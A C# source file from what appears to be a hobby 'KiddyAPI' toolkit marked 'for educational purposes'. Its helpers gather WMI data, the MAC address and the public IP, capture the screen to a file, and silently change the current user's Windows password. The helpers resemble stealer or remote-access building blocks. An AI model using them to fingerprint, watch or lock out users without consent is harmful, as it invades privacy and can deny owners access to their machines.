/////////////////////////////////////////////////////////
//// Developer : Whiro
//// For for educational purposes
//////////////////////////////////////////////////////////

using System;
using System.Collections.Generic;
using System.DirectoryServices.AccountManagement;
using System.Drawing;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Windows.Forms;

namespace KiddyAPI.Info
{
    public class SystemWork
    {
        /// <summary>
        /// Get Info from WMI
        /// </summary>
        /// <param name="WinClass">WMI class</param>
        /// <param name="ClassItem">Name in WMIClass</param>
        /// <returns>Возвращает List<string> информации о заданном модуле</returns>
        public static List<string> GetInfo(string WinClass, string ClassItem)
        {

            List<string> result = new List<string>();
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM " + WinClass);
            try
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    result.Add(obj[ClassItem].ToString().Trim());
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return result;
        }
        /// <summary>
        /// Get Mac without :
        /// </summary>
        /// <returns>Mac addres Ethernet - adapter</returns>
        public static string GetMacAddress()
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                
                if (nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                    nic.OperationalStatus == OperationalStatus.Up)
                {
                    return nic.GetPhysicalAddress().ToString();
                }
            }
            return null;
        }
        /// <summary>
        /// Get global IP
        /// </summary>
        /// <returns>IP in string value</returns>
        public static string GetIP()
        {
            string IP = new WebClient().DownloadString("http://icanhazip.com/");
            return IP;
        }
        /// <summary>
        /// Get ScreenShot
        /// </summary>
        /// <param name="path">Path To Save </param>
        public static void GetScreen(string path)
        {
            var scrn = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            var graphics = Graphics.FromImage(scrn);
            graphics.CopyFromScreen(0, 0, 0, 0, scrn.Size);
            var img = scrn;
            img.Save(path);
        }

        /// <summary>
        /// Change Windows password
        /// </summary>
        /// <param name="pass">New Password</param>
        public static void ChangeWinPass(string pass)
        {
            PrincipalContext context = new PrincipalContext(ContextType.Machine);
            UserPrincipal currentUser = UserPrincipal.FindByIdentity(context, IdentityType.SamAccountName, Environment.UserName);
            currentUser?.SetPassword(pass);
        }
    }
}
